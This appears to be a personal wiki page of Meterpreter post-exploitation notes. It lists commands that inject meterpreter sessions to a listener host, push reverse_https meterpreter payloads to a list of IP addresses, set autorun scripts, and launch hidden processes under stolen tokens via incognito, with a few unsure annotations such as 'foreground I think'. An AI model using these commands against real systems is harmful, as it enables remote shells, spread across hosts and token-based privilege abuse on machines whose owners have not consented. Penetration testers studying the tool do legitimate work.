<!-- TITLE: Meterpreter -->
<!-- SUBTITLE: A quick summary of Meterpreter -->

# Sending Shells to other people

run duplicate -D -r -e executable_to_inject -p 4444 -r listenhost

Next command will send meterpreters to each ip in -mr list

run multi_meter_inject -pt windows/meterpreter/reverse_https -mr 10.128.129.200,10.128.129.201 -p 443

# Auto Run Script

set AutoRunScript multi_console_command -rc commands.rc

# Exec

execute -i -f bash
-i interact
-f foreground I think
will execute the process. exit returns to meterpreter.

Execing with other Token:
incognito
execute -t will use the current token
-h will hide from screen
-c will chanelize it
-i will let you interact with it


